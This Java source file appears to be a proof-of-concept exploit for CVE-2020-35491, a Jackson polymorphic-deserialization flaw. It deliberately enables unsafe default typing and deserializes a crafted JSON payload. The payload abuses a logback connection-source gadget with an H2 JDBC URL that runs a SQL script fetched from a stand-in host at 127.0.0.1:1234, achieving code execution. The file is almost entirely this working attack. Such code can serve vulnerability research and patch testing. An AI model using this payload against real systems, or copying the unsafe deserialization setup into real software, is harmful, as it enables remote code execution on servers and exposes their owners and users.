package org.example;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.SerializationFeature;

import java.io.IOException;

/**
 * Hello world!
 *
 */
public class CVE_2020_35491
{
    public static void main( String[] args ) throws IOException {
        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping();
        mapper.configure(SerializationFeature.FAIL_ON_EMPTY_BEANS, false);
        String json = "[\"com.newrelic.agent.deps.ch.qos.logback.core.db.DriverManagerConnectionSource\", " +
                "{\"url\":\"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://127.0.0.1:1234/exec.sql'\"}]";
        Object obj = mapper.readValue(json, Object.class);
        mapper.writeValueAsString(obj);
    }
}
